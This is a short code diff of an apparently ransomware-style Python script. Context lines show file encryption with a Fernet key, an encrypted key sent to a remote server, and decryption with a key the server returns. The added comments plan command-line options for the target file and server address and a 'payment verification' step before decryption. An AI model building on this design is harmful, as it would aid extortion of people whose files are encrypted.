@@ -50,6 +50,15 @@ def sendEncryptedKey(eKeyFilePath):
             decryptFile(filePath, returned_key)
 
 
+# add CL Args here using arg parse.
+# Args include: 
+#   File to Encrypt (reqd), 
+#   IP/Port of the server(to be put on the cloud, req'd later, not for testing)
+#   
+
+
+
+
 # This line generates a Fernet key
 symmetricKey = Fernet.generate_key()
 # The key is then passed into the Fernet instance
@@ -89,6 +98,8 @@ with open(filePath, "wb") as file:
 # load up the encrypted key to send to the server that is running. 
     eKeyFilePath = ".\encryptedSymmertricKey.key"
 # Create the variables for host/port
+
+#THIS IS WHERE We need to add the payment verification. 
 
 
 sendEncryptedKey(eKeyFilePath)
